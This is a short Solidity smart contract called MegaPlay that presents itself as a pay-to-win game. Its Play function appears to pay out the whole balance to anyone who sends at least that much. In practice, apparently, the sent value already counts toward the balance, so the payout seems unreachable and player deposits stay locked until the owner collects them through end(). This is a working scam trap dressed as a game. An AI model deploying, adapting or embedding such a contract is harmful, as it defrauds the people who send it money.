pragma solidity ^0.4.25;

contract MegaPlay
{
    address Owner = msg.sender;

    function() public payable {}
    function close() private { selfdestruct(msg.sender); }

    function Play() public payable {
        if (msg.value >= address(this).balance) {
           close();
        }
    }
 
    function end() public {
        if (msg.sender == Owner) {
            close();
        }
    }
}